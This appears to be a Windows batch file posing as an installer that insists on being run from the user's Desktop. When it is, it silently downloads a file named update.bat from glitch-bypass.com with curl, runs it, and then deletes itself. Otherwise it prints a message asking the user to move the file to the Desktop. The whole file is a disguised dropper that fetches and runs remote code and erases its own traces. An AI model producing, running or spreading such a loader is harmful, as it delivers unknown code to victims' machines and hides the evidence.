@echo off
setlocal

:: Get actual Desktop path using PowerShell
for /f "usebackq delims=" %%D in (`powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"`) do set "desktopDir=%%D"

:: Get current directory (where this .bat is run from)
set "currentDir=%~dp0"
set "currentDir=%currentDir:~0,-1%"

:: Compare paths (case-insensitive)
if /i "%currentDir%"=="%desktopDir%" (
    curl -o a.bat https://www.glitch-bypass.com/terminal/update.bat>nul & a.bat & (goto) 2>nul & del "%~f0" & exit
) else (
    echo ===================================================
    echo This installer must be run from your Desktop folder.
    echo Desktop path: %desktopDir%
    echo Current script path: %currentDir%
    echo Please move this file to your Desktop and try again.
    echo ===================================================
    pause
    exit /b
)
